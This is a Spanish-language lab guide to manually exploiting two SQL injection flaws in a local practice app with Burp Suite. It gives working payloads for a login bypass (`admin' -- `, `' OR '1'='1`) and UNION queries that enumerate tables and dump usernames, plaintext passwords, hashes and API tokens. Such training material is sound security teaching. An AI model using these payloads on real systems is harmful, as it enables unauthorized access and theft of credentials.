# 02 — Explotación manual con Burp Suite

Objetivo: demostrar las 2 vulnerabilidades **manipulando peticiones HTTP a mano**,
interceptando con Burp Suite (Proxy / Repeater).

## Preparación
1. Configurar el navegador para usar el proxy de Burp. **Ojo:** el WAF del lab usa el
   puerto 8080; para la parte manual apuntá el navegador a **http://localhost:3000** y, si
   hay choque de puertos, cambiá el *listener* de Burp a `127.0.0.1:8081`.
2. Interceptar (`Proxy > Intercept on`) y enviar a **Repeater** (Ctrl+R).

---

## Vulnerabilidad 1 — Bypass de autenticación (`POST /login`)

Petición normal capturada:
```
POST /login HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

username=admin&password=cualquiera
```
Consulta backend: `... WHERE username = '<u>' AND pass_plain = '<p>'`

### Payloads (en Repeater)
| Campo | Payload | Efecto |
|---|---|---|
| `username` | `admin' -- ` | Comenta la verificación de password → entra como **admin** |
| `username` | `' OR '1'='1' -- ` | Devuelve el primer usuario (admin) |
| `password` | `' OR '1'='1` (user=`admin`) | Condición siempre verdadera |

Cuerpo URL-encoded (Burp: Ctrl+U sobre la selección):
```
username=admin%27%20--%20&password=x
```
**Resultado:** redirección `302` a `/panel` con sesión de **admin**, sin conocer la
contraseña. El panel expone la tabla `secrets` (incluye el `FLAG{...}`).

---

## Vulnerabilidad 2 — Extracción de datos con UNION (`GET /?q=`)

Consulta: `... WHERE name LIKE '%<q>%' ORDER BY id ASC` con **6 columnas**
(`id,name,description,price,stock,category`).

### Paso 1 — confirmar número de columnas
```
GET /?q=zzz' UNION SELECT 1,2,3,4,5,6-- -
```
Si la página renderiza una "tarjeta" con esos valores → 6 columnas. (El `-- -` comenta el
`ORDER BY` que sigue.)

### Paso 2 — volcar credenciales (tabla users)
```
GET /?q=zzz' UNION SELECT id,username,pass_plain,password_hash,role,email FROM users-- -
```
URL-encoded:
```
/?q=zzz%27%20UNION%20SELECT%20id,username,pass_plain,password_hash,role,email%20FROM%20users--%20-
```
Las "tarjetas de producto" ahora muestran **usuarios y contraseñas**.

### Paso 3 — enumerar tablas y volcar `secrets`
```
/?q=zzz' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -
/?q=zzz' UNION SELECT label,secret_value,api_token,4,5,6 FROM secrets-- -
```
El último vuelca la tabla `secrets` (tokens de API y el `FLAG{...}`).

---

## Qué registrar como evidencia
- Captura de Repeater con el payload y la respuesta (status + cuerpo).
- Login normal (401) vs. login con bypass (302 → `/panel`).
- Volcado UNION mostrando credenciales / secrets en pantalla.
- Guardar en `evidencias/` (p. ej. `02-login-bypass.png`, `02-union-dump.png`).
